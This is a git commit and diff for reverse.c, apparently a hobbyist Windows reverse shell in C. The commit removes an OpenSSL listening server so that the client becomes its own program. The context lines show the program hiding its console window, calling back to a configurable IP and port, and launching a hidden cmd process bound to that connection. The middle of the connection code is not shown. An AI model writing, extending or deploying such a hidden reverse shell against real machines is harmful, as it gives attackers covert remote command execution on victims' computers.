32710fe7e5b733a4aa82e54559b2b9f6d92d3011
mbobbitt3 <mattbobbitt3@gmail.com>
2023-04-25 14:50:02 -0400

    broke shell down into two scripts, server and shell one makes the shell connection the other starts an encrypted server to listen

--- reverse.c
+++ reverse.c
@@ -15,36 +15,7 @@
 # define CLIENT_IP (char*)"127.0.0.1"
 # define CLIENT_PORT (int)444
 #endif
-SSL_CTX *create_context()
-{
-    const SSL_METHOD *method;
-    SSL_CTX *ctx;
-
-    method = TLS_server_method();
-
-    ctx = SSL_CTX_new(method);
-    if (!ctx) {
-        perror("Unable to create SSL context");
-        ERR_print_errors_fp(stderr);
-        exit(EXIT_FAILURE);
-    }
-
-    return ctx;
-}
-void configure_context(SSL_CTX *ctx)
-{
-    /* Set the key and cert */
-    if (SSL_CTX_use_certificate_file(ctx, "server.pem", SSL_FILETYPE_PEM) <= 0) {
-        ERR_print_errors_fp(stderr);
-        exit(EXIT_FAILURE);
-    }
-
-    if (SSL_CTX_use_PrivateKey_file(ctx, "key.pem", SSL_FILETYPE_PEM) <= 0 ) {
-        ERR_print_errors_fp(stderr);
-        exit(EXIT_FAILURE);
-    }
-}
-int shell() {
+int main() {
 	FreeConsole();
     if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
 		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
@@ -86,48 +57,4 @@ int shell() {
 	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
 	return (0);
-}
-int main(int argc, char **argv)
-{
-    int sock;
-    SSL_CTX *ctx;
-
-    /* Ignore broken pipe signals */
-    signal(SIGPIPE, SIG_IGN);
-
-    ctx = create_context();
-
-    configure_context(ctx);
-
-    sock = shell();
-
-    /* Handle connections */
-    while(1) {
-        struct sockaddr_in addr;
-        unsigned int len = sizeof(addr);
-        SSL *ssl;
-        const char reply[] = "test\n";
-
-        int client = accept(sock, (struct sockaddr*)&addr, &len);
-        if (client < 0) {
-            perror("Unable to accept");
-            exit(EXIT_FAILURE);
-        }
-
-        ssl = SSL_new(ctx);
-        SSL_set_fd(ssl, client);
-
-        if (SSL_accept(ssl) <= 0) {
-            ERR_print_errors_fp(stderr);
-        } else {
-            SSL_write(ssl, reply, strlen(reply));
-        }
-
-        SSL_shutdown(ssl);
-        SSL_free(ssl);
-        close(client);
-    }
-
-    close(sock);
-    SSL_CTX_free(ctx);
 }
